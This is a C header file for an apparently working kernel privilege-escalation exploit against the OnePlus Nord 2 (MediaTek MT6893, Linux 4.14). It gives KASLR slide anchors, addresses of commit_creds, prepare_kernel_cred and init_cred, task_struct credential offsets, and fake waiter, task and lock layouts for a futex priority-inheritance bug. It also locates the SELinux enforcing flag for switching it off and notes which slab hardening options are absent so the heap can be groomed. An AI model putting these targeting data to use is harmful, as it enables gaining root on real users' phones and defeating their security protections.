/* target.h - OnePlus Nord 2 (DN2101/DN2103) MediaTek MT6893 4.14.186+
 * 
 * Build: #1 SMP PREEMPT Wed Jun 30 13:26:18 CST 2021
 * Extracted from: boot.img via vmlinux-to-elf + disassembly
 * KASLR slide derived at runtime from perf_event_init_task
 */
#ifndef TARGET_H
#define TARGET_H

/* ============================================================
 * KASLR Configuration
 * ============================================================
 * KIMAGE_TEXT_BASE is the STATIC link address (without KASLR)
 * Runtime kernel base is computed at boot time
 * 
 * perf_event_init_task:
 *   static   = 0xffffff80081f2f74
 *   runtime  = 0xffffff876c3f2f74
 *   slide    = runtime - static = 0x764200000
 */
#define KIMAGE_TEXT_BASE            0xffffff8008080000ULL  /* static _text */
#define KIMAGE_STATIC_BASE          KIMAGE_TEXT_BASE

/* Runtime kernel base for fallback (computed at runtime from perf) */
#define ACTUAL_KERNEL_BASE          0xffffff876c280000ULL  /* example runtime base */

/* MediaTek 4.14 memory map */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40080000ULL

/* pselect waiter word shift */
#define PSELECT_WAITER_WORD_SHIFT 0

/* ============================================================
 * RUNTIME FUNCTION ADDRESSES (static, use canon_addr())
 * ============================================================
 * Offsets computed from perf_event_init_task = 0xffffff80081f2f74
 */
#define COMMIT_CREDS_OFF            0x00060f04ULL  /* from real kallsyms */
#define PREPARE_KERNEL_CRED_OFF     0x0006129cULL  /* from real kallsyms */

#define COMMIT_CREDS_IMAGE          (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
#define PREPARE_KERNEL_CRED_IMAGE   (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)

/* ============================================================
 * DATA SYMBOLS (static addresses, use canon_addr())
 * ============================================================
 * init_cred: found via prepare_kernel_cred NULL-daemon branch
 *   adrp x19, 0xffffff8009d89000
 *   add  x19, x19, #0xfc8
 *   → 0xffffff8009d89fc8 static
 */
#define INIT_CRED_STATIC            0xffffff8009d89fc8ULL
#define INIT_CRED                   INIT_CRED_STATIC  /* for canon_addr() */

/* ============================================================
 * TASK_STRUCT FIELD OFFSETS
 * ============================================================
 * MTK BSP adds ~0x288 bytes vs upstream 4.14 — ALL offsets shifted
 * Verified by disassembly of commit_creds, get_task_mm, remove_waiter
 */
#define TASK_MM_OFFSET              0x560ULL   /* upstream=0x268 WRONG */
#define TASK_CRED_OFFSET            0x7D0ULL   /* upstream=0x548 WRONG */
#define TASK_REAL_CRED_OFFSET       0x7D8ULL   /* upstream=0x550 WRONG */
#define TASK_PI_BLOCKED_ON_OFFSET   0x8B4ULL   /* upstream=0x6C8 WRONG */
#define TASK_PI_LOCK_CLEAR_OFFSET   0x8D8ULL   /* from remove_waiter str xzr */
#define TASK_NSPROXY_OFFSET         0x688ULL
#define TASK_PIDS_OFFSET            0x650ULL
#define TASK_MM_LOCK_OFFSET         0x8B0ULL   /* mmap_sem */

/* For compatibility with existing code */
#define TASK_REAL_CRED_OFF TASK_REAL_CRED_OFFSET
#define TASK_CRED_OFF TASK_CRED_OFFSET
#define TASK_MM_OFF TASK_MM_OFFSET

/* ============================================================
 * MM_STRUCT configuration
 * ============================================================ */
#define MM_STRUCT_SIZE              0x17CULL
#define MM_STRUCT_SZ 0x380   /* Nord 2 k4.14: sizeof(mm_struct) = 896 bytes from /proc/slabinfo */

/* ============================================================
 * rt_mutex_waiter layout for 4.14 (flat 10-word layout)
 * ============================================================ */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

/* Fake waiter layout */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38

/* Fake task layout */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_UCLAMP_REQ_OFF 0x408
#define FAKE_TASK_UCLAMP_OFF 0x410

/* ============================================================
 * CORRECTED offsets from vmlinux disassembly (July 2026)
 * ============================================================ */
#define INIT_TASK (KIMAGE_TEXT_BASE + 0x157b6c0ULL)
#define INIT_USER_NS (KIMAGE_TEXT_BASE + 0x1588070ULL)
#define SELINUX_STATE (KIMAGE_TEXT_BASE + 0x1aa4290ULL)

// CORRECTED: __per_cpu_offset array from smp_prepare_cpus disassembly
// adrp x25, 0xffffff80096dd000; add x25, x25, #0xe58
#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + 0x185de58ULL)

// CORRECTED: ENTRY_TASK template from __switch_to disassembly
// adrp x9, 0xffffff8009878000; add x9, x9, #0x70
#define ENTRY_TASK (KIMAGE_TEXT_BASE + 0x17f8070ULL)

/* KASLR anchors for slide technique */
#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + 0x00ef1e90ULL)
#define SLIDE_INIT_TASK_IMAGE INIT_TASK
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + 0x17a7c00ULL)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + 0x17a7c00ULL)

// CORRECTED: Use init_cred as boot_id data anchor (OSS offset was outside kernel image)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE INIT_CRED_STATIC

/* loggers array */
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + 0x156f318ULL)

/* SELinux - enforcing is at offset 0 of selinux_state struct */
#define SELINUX_ENFORCING SELINUX_STATE

/* ============================================================
 * FAKE_LOCK - BSS zero page (valid unlocked rt_mutex)
 * ============================================================
 * An all-zero memory region is a valid rt_mutex:
 *   +0x00: wait_lock = 0  (unlocked spinlock)
 *   +0x08: waiters = 0    (empty rb_root)
 *   +0x18: owner = 0      (no owner)
 * Kernel locks unlocked spinlock, finds no owner, unlocks, returns OK.
 */
#define FAKE_LOCK_STATIC            0xffffff8009d6d000ULL
#define FAKE_LOCK_PHYS_ALIAS        0xffffff8001d6d000ULL

/* ============================================================
 * SELINUX_STATE chain (from avc_has_perm, sel_read_enforce)
 * ============================================================
 * selinux_state pointer at: 0xffffff8009d6dac8
 * selinux_state->ss at offset: 0x18
 * selinux_ss->enforcing at offset: 0x0
 */
#define SELINUX_STATE_PTR_STATIC    0xffffff8009d6dac8ULL
#define SELINUX_SS_OFFSET           0x18ULL
#define SELINUX_ENFORCING_OFFSET    0x0ULL

/* ============================================================
 * SLAB CONFIG
 * ============================================================
 * SLAB_FREELIST_RANDOM    = n  ← deterministic grooming
 * SLAB_FREELIST_HARDENED  = n  ← freelist ptrs not XOR'd
 * SLAB_MERGE_DEFAULT      = y  ← compatible caches merge
 * HARDENED_USERCOPY       = y  ← avoid copy_to_user primitives
 * PAGE_POISONING          = n  ← UAF reads return real stale data
 * CONFIG_FUTEX_PI         = y  ← GhostLock applicable
 */

#endif /* TARGET_H */
